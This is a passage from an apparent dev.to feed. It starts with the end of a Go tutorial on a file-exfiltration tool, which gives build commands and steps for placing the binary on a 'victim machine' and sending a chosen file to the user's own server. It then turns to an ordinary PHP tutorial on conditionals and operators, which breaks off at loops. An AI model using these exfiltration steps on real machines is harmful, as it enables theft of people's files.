  &lt;a href="#making-it-windows-and-linux-suitable"&gt;
  &lt;/a&gt;
  Making it Windows and Linux suitable
&lt;/h3&gt;

&lt;p&gt;During exfiltration my main issue was that I was not able to run some program on windows which I was easily able to run on Linux. As Golang provides us with this ability I built the same binary for windows as well. &lt;/p&gt;

&lt;p&gt;Let's check how to do that - &lt;br&gt;
To make the file windows specific&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ GOOS=windows GOARCH=amd64 go build .
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will create a file called &lt;code&gt;data_exfiltrator.exe&lt;/code&gt; which you can now run on windows.&lt;/p&gt;

&lt;p&gt;Generally the scenario is to hack files from windows and hackers have Linux as their own host. That's why having &lt;code&gt;data_exfiltrator.exe&lt;/code&gt; and &lt;code&gt;data_exfiltrator&lt;/code&gt; will be very helpful because we can now mix and match the use cases to a wide range.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#how-to-use-the-above-file"&gt;
  &lt;/a&gt;
  How to use the above file
&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;Once you have built the binary, go over to the victim machine, and keep this binary over there. if it's windows then copy the windows binary for the same.&lt;/li&gt;
&lt;li&gt;On your local machine run the server by &lt;code&gt;./data_exfiltrator server --ouput &amp;lt;outputfile&amp;gt; --host &amp;lt;yourIP&amp;gt; --port &amp;lt;yourPort&amp;gt;&lt;/code&gt; command. If you local is also  windows then run &lt;code&gt;./data_exilftrator.exe server&lt;/code&gt; with similar flags.&lt;/li&gt;
&lt;li&gt;Now on the victim side run &lt;code&gt;./data_exfiltrator.exe client -f &amp;lt;filetohack&amp;gt; --host &amp;lt;serverhost&amp;gt; --port &amp;lt;serverport&amp;gt;&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;You will get the &lt;code&gt;&amp;lt;filetohack&amp;gt;&lt;/code&gt; file in your local with the name &lt;code&gt;&amp;lt;outputfile&amp;gt;&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;The above program if read in a single take might become a nightmare to perform that's why I made it a point to distribute it in lot of small chunks. The main takeaway is to understand the logic of socket programming and how to create a CLI application in Golang.&lt;br&gt;
To get the complete source code you can refer to &lt;a href="https://github.com/dunefro/data_exfiltrator"&gt;GITHUB&lt;/a&gt;. Let me know what do you think about this.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#references"&gt;
  &lt;/a&gt;
  References
&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href="https://blog.knoldus.com/create-kubectl-like-cli-with-go-and-cobra/"&gt;https://blog.knoldus.com/create-kubectl-like-cli-with-go-and-cobra/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dev.to/aurelievache/learning-go-by-examples-part-3-create-a-cli-app-in-go-1h43"&gt;https://dev.to/aurelievache/learning-go-by-examples-part-3-create-a-cli-app-in-go-1h43&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/spf13/cobra"&gt;https://github.com/spf13/cobra&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

</description>
      <category>go</category>
      <category>programming</category>
      <category>cybersecurity</category>
    </item>
    <item>
      <title>PHP crash course : Conditionals, Loops and Functions</title>
      <author>Eric The Coder</author>
      <pubDate>Sun, 23 Jan 2022 18:02:50 +0000</pubDate>
      <link>https://dev.to/ericchapman/php-crash-course-conditionals-loops-and-functions-ck6</link>
      <guid>https://dev.to/ericchapman/php-crash-course-conditionals-loops-and-functions-ck6</guid>
      <description>&lt;p&gt;Today you will learn conditionals, loops and functions création in PHP.&lt;/p&gt;

&lt;p&gt;This PHP crash course is free and will be posted here on dev.to. I'll be releasing a new article/post every two days or so. To not miss anything, you can follow me on twitter: &lt;a href="https://twitter.com/EricTheCoder_"&gt;Follow @EricTheCoder_&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#conditional-execution"&gt;
  &lt;/a&gt;
  Conditional execution
&lt;/h1&gt;

&lt;p&gt;In PHP, it is possible to execute a line of code only if a condition is true&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello Mike'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The code enclosed in the parentheses is called an expression. PHP will execute this code and return its boolean value (true or false).&lt;/p&gt;

&lt;p&gt;If the result is 'true' then the code contained between the { } will be executed.&lt;/p&gt;

&lt;p&gt;If the result is false, nothing will be executed in this if block&lt;/p&gt;

&lt;p&gt;Here is another example with the operator greater than « &amp;gt; »&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;120&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Free shipping'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the expression ($amount) will return true, so shipping will be free.&lt;/p&gt;

&lt;p&gt;It is possible to execute code if the condition is false&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;120&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Free shipping'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Shipping 9.95$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the keyword else executes the code if the expression is 'false'&lt;/p&gt;

&lt;p&gt;Finally, it is possible to have several conditions&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;120&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Free shipping'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;elseif&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Shipping 9.95$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Shipping 19.95$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The elseif keyword is used to test another condition. Note that this condition will be tested only if the first condition is false.&lt;/p&gt;

&lt;p&gt;If both the first and the second condition are false, then the code in the else section will be executed.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#comparison-operator"&gt;
  &lt;/a&gt;
  Comparison operator
&lt;/h3&gt;

&lt;p&gt;Here are the different operators that can be used in expressions.&lt;/p&gt;

&lt;p&gt;==   equal no type check&lt;br&gt;
===  equal with type check&lt;br&gt;
!=   not equal&lt;br&gt;
||   or&lt;br&gt;
&amp;amp;&amp;amp;   and&lt;br&gt;
&amp;gt;   greater than&lt;br&gt;
&amp;lt;   less than&lt;/p&gt;

&lt;p&gt;it is possible to test several expressions at the same time with the operator &amp;amp;&amp;amp;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'The price is between 1 and 49'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The same principle applies for the operator or ||&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'The price is 100$ or 200$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Expressions without a comparison operator&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'The price is not zéro'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the expression ($amount) does not contain a comparison operator, despite this fact, this code is valid. Why ? In PHP each expression is converted into a Boolean value. So here 0 is converted to false. Any other value other than zero (or null) would convert to true.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#conversion-to-boolean-value"&gt;
  &lt;/a&gt;
  Conversion to boolean value
&lt;/h3&gt;

&lt;p&gt;Here is the list of values that will be converted to false &lt;/p&gt;

&lt;p&gt;false&lt;/p&gt;

&lt;p&gt;0&lt;/p&gt;

&lt;p&gt;0.0&lt;/p&gt;

&lt;p&gt;null&lt;/p&gt;

&lt;p&gt;‘0’ (string equal to zero)&lt;/p&gt;

&lt;p&gt;‘ ’ (empty string)&lt;/p&gt;

&lt;p&gt;&lt;a href="https://dev.toempty%20array"&gt; &lt;/a&gt;&lt;/p&gt;

&lt;p&gt;All other values will convert to true&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#here-are-some-examples-of-conversion-to-boolean-value"&gt;
  &lt;/a&gt;
  Here are some examples of conversion to boolean value
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$messsage&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'Hello World'&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// true&lt;/span&gt;
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$messsage&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Variable is set'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Variable is unset'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#using-if-statement-in-an-html-file"&gt;
  &lt;/a&gt;
  Using IF statement in an HTML file
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;html&lt;/span&gt; &lt;span class="na"&gt;lang=&lt;/span&gt;&lt;span class="s"&gt;"en"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
    &lt;span class="cp"&gt;&amp;lt;?php $isAdmin = true; ?&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Home page&lt;span class="nt"&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

    &lt;span class="cp"&gt;&amp;lt;?php if ($isAdmin) : ?&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Welcome Administrator&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
    &lt;span class="cp"&gt;&amp;lt;?php else : ?&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Welcome Guest&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
    &lt;span class="cp"&gt;&amp;lt;?php endif ?&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Each block of PHP code has an opening and closing tag. The particularity here is the “if” and “else” code block. There's no  { }. You can use “:” instead.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#switch"&gt;
  &lt;/a&gt;
  Switch
&lt;/h3&gt;

&lt;p&gt;If we have several conditions, the if, elseif ect. can result in hard-to-read code. In this case, the Switch statement helps to simplify your code.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$color&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s1"&gt;'red'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Danger'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
         &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s1"&gt;'yellow'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Warning'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s1"&gt;'green'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Success'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'The color is unknown'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The first line represents the expression we want to evaluate: switch($color)&lt;/p&gt;

&lt;p&gt;Then just include the possible “cases”.&lt;/p&gt;

&lt;p&gt;The “break” function prevents the execution from continuing&lt;/p&gt;

&lt;p&gt;The “case” default is used if there is no matching case.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#match"&gt;
  &lt;/a&gt;
  Match
&lt;/h3&gt;

&lt;p&gt;New in PHP 8.1, this instruction allows you to return an expression according to a key ⇒ value correspondence&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$color&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;'red'&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'danger'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;'yellow'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'orange'&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'warning'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;'green'&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'success'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'Unknown'&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The first line represents the expression we want to match: &lt;strong&gt;match&lt;/strong&gt;($color)&lt;/p&gt;

&lt;p&gt;On the second line we notice that it is possible to match more than one expression at a time.&lt;/p&gt;

&lt;p&gt;Then follows a list of &lt;strong&gt;key&lt;/strong&gt; ⇒ &lt;strong&gt;value&lt;/strong&gt;. If no &lt;strong&gt;key&lt;/strong&gt;→&lt;strong&gt;value&lt;/strong&gt; is found, the &lt;strong&gt;default&lt;/strong&gt; key will be executed.&lt;/p&gt;

&lt;p&gt;Note that the key can be an expression and the value can also be an expression and even a function&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$color&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;userID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;openAdmin&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
    &lt;span class="n"&gt;userID&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;userID&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;openUser&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
    &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;openOther&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#switch-ou-match-"&gt;
  &lt;/a&gt;
  Switch ou Match ?
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Match&lt;/strong&gt; is visually simpler but &lt;strong&gt;Switch&lt;/strong&gt; allows to execute more than one line of code for each “box”. &lt;strong&gt;Match&lt;/strong&gt; returns a value which &lt;strong&gt;Switch&lt;/strong&gt; does not. In short, I use &lt;strong&gt;Match&lt;/strong&gt; if possible because I find the instruction more visually refined but otherwise I have no problem with the &lt;strong&gt;Switch&lt;/strong&gt; instruction&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#ternary-operator-"&gt;
  &lt;/a&gt;
  Ternary operator  ?:
&lt;/h3&gt;

&lt;p&gt;This is a shorthand syntax for an if...else.&lt;/p&gt;

&lt;p&gt;Here is an example with if...else&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$isValid&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'user valid'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'user not valid'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here is the same example but with the Ternary operator&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$isValid&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="s1"&gt;'user valid'&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'user not valid'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If the expression preceding the operator “?” is true then the value following “?” will be used, otherwise the value following the “:” will be used.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#the-null-coalescing-operator-"&gt;
  &lt;/a&gt;
  The null coalescing operator ??
&lt;/h3&gt;

&lt;p&gt;The Null coalescing operator returns its first operand if it exists and is not NULL; otherwise it returns its second operand&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;??&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;//output 'Mike' if $name is null&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#assignment-with-null-coalescing-operator-"&gt;
  &lt;/a&gt;
  Assignment with Null coalescing operator ??
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;??=&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Assigns the value 'Mike' if the variable $name is null&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#null-safe-operator"&gt;
  &lt;/a&gt;
  Null safe operator
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$user&lt;/span&gt;&lt;span class="o"&gt;?-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;profile&lt;/span&gt;&lt;span class="o"&gt;?-&amp;gt;&lt;/span&gt;&lt;span class="nf"&gt;activate&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If one of the variables preceding the “?” is null then the value of of the expression will be null&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#loops"&gt;
  &lt;/a&gt;
  Loops
&lt;/h1&gt;

&lt;h3&gt;
  &lt;a href="#the-while-loop"&gt;
  &lt;/a&gt;
  The “while” loop
&lt;/h3&gt;

&lt;p&gt;Allows a block of code to be executed a certain number of times. The number of times will depend on the conditions. As long as the condition is true, the code block will run.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
